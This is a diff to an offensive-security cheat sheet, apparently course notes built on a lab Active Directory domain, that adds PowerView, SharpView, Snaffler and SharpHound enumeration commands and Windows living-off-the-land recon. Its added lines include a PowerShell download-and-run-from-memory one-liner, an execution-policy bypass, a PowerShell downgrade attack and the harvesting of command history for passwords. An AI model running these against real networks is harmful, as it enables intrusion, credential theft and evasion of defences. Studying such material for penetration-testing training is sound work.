@@ -1137,10 +1137,9 @@ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 # Windows-based command used to register the SocksOverRDP-PLugin.dll. (https://github.com/nccgroup/SocksOverRDP)
 regsvr32.exe SocksOverRDP-Plugin.dll   
 ```
-##### Pivoting with ligolo-ng
+##### [Pivoting with ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 ```
 # Download Proxy and  Agent of ligolo-ng .  (https://github.com/nicocha30/ligolo-ng)
-
 mkdir ligolo && cd ligolo
 (Download Proxy  for Linux)
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
@@ -1416,52 +1415,240 @@ Get-ADGroup -Identity "Backup Operators"
 
 # PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
 Get-ADGroupMember -Identity "Backup Operators"
+
+# use SharpView to get help
+.\SharpView.exe Get-DomainUser -Help
+
+# use SharpView to enumerate information about a specific user
+.\SharpView.exe Get-DomainUser -Identity forend
+
+# Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.  (https://github.com/SnaffCon/Snaffler)
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+
+# running the SharpHound.exe collector
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
 ```
-##### [Credentialed Enumeration - from Windows with PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+##### [Credentialed Enumeration - from Windows with PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) 
 ```
-# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
-Get-Module
+# PowerView script used to append results to a CSV file. Performed from a Windows-based host.
+import-module .\PowerView.ps1
+Export-PowerViewCSV
 
-# Loads the Active Directory PowerShell module from a Windows-based host.
-Import-Module ActiveDirectory
+# PowerView script used to convert a User or Group name to it's SID. Performed from a Windows-based host.
+ConvertTo-SID
 
-# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
-Get-ADDomain
+# PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host.
+Get-DomainSPNTicket
 
-# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+(Domain/LDAP Functions)
 
-# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
-Get-ADTrust -Filter * | select name
+# PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.
+Get-Domain
 
-# PowerShell cmd-let used to search for a specifc group (-Identity "Backup Operators"). Performed from a Windows-based host.
-Get-ADGroup -Identity "Backup Operators"
+# PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.
+Get-DomainController
 
-# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
-Get-ADGroupMember -Identity "Backup Operators"
+# PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.
+Get-DomainUser
+
+# PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.
+Get-DomainComputer
+
+# PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.
+Get-DomainGroup
+
+# PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.
+Get-DomainOU
+
+# PowerView script used to find object ACLs in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.
+Find-InterestingDomainAcl
+
+# PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.
+Get-DomainGroupMember
+
+# PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.
+Get-DomainFileServer
+
+# PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.
+Get-DomainDFSShare
+
+(GPO Functions)
+
+# PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.
+Get-DomainGPO
+
+# PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.
+Get-DomainPolicy
+
+(Computer Enumeration Functions)
+
+# PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.
+Get-NetLocalGroup
+
+# PowerView script enumerate members of a specific local group. Performed from a Windows-based host.
+Get-NetLocalGroupMember
+
+# PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.
+Get-NetShare
+
+# PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.
+Get-NetSession
+
+# PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.
+Test-AdminAccess
+
+(Threaded 'Meta'-Functions)
+
+# PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.
+Find-DomainUserLocation
+
+# PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.
+Find-DomainShare
+
+# PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.
+Find-InterestingDomainShareFile
+
+# PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.
+Find-LocalAdminAccess
+
+(Domain Trust Functions)
+
+# PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.
+Get-DomainTrust
+
+# PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.
+Get-ForestTrust
+
+# PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.
+Get-DomainForeignUser
+
+# PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.
+Get-DomainForeignGroupMember
+
+# PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.
+Get-DomainTrustMapping
+
+# PowerView script that enumerates all of Domain User Information (mmorgan). Performed from a Windows-based host.
+ Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+# PowerView script used to Testing for Local Admin Access. Performed from a Windows-based host.
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+# PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host.
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
 ##### Living Of The Land
 ```
-# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
+(Basic Enumeration Commands)
+
+# Prints the PC's Name
+hostname
+
+# Prints out the OS version and revision level
+[System.Environment]::OSVersion.Version
+
+# Prints the patches and hotfixes applied to the host
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Prints a summary of the host's information
+systeminfo
+
+# Prints out network adapter state and configurations
+ipconfig /all
+
+# Displays a list of environment variables for the current session (ran from CMD-prompt)
+set
+
+# Displays the domain name to which the host belongs (ran from CMD-prompt)
+echo %USERDOMAIN%
+
+# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+echo %logonserver%
+
+(Harnessing PowerShell)
+
+# Lists available modules loaded for use.
 Get-Module
 
-# Loads the Active Directory PowerShell module from a Windows-based host.
-Import-Module ActiveDirectory
+# Will print the execution policy settings for each scope on a host.
+Get-ExecutionPolicy -List
 
-# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
-Get-ADDomain
+# This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
+Set-ExecutionPolicy Bypass -Scope Process
 
-# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+# Return environment values such as key paths, users, computer information, etc.
+Get-ChildItem Env: | ft Key,Value
 
-# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
-Get-ADTrust -Filter * | select name
+# With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 
-# PowerShell cmd-let used to search for a specifc group (-Identity "Backup Operators"). Performed from a Windows-based host.
-Get-ADGroup -Identity "Backup Operators"
+# This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
 
-# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
-Get-ADGroupMember -Identity "Backup Operators"
+(Downgrade Powershell)
+
+# Check your current PowerShell version and host information.
+Get-host
+
+# Revert your PowerShell session to version 2.0 (Downgrade Attack).
+powershell.exe -version 2
+
+(Checking Defenses)
+
+# Display the Windows Firewall status across all profiles.
+netsh advfirewall show allprofiles
+
+# Display the Windows Firewall and check all rule.
+netsh advfirewall firewall show rule name=all
+
+# Queryes the service status of Windows Defender.
+sc query windefend
+
+# Displays the detailed status of Microsoft Defender (PowerShell).
+Get-MpComputerStatus
+
+(Checking Session in one account)
+
+# This command displays a list of all currently active login (sessions) on the Windows system.
+qwinsta
+
+(Network Information)
+
+# Lists all known hosts stored in the arp table.
+arp -a
+
+# Prints out adapter settings for the host. We can figure out the network segment from here.
+ipconfig /all
+
+# Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
+route print
+
+# 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
+netsh advfirewall show allprofiles
+
+(Windows Management Instrumentation (WMI))
+(https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
+
+# Prints the patch level and description of the Hotfixes applied
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Displays basic host information to include any attributes within the list
+wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+
+# A listing of all processes on host
+wmic process list /format:list
+
+# Displays information about the Domain and Domain Controllers
+wmic ntdomain list /format:list
+
+# Displays information about all local accounts and any domain accounts that have logged into the device
+wmic useraccount list /format:list
+
+# Information about all local groups
+wmic group list /format:list
+
+# Dumps information about any system accounts that are being used as service accounts.
+wmic sysaccount list /format:list
 ```
 ##### Kerberoasting
 ```
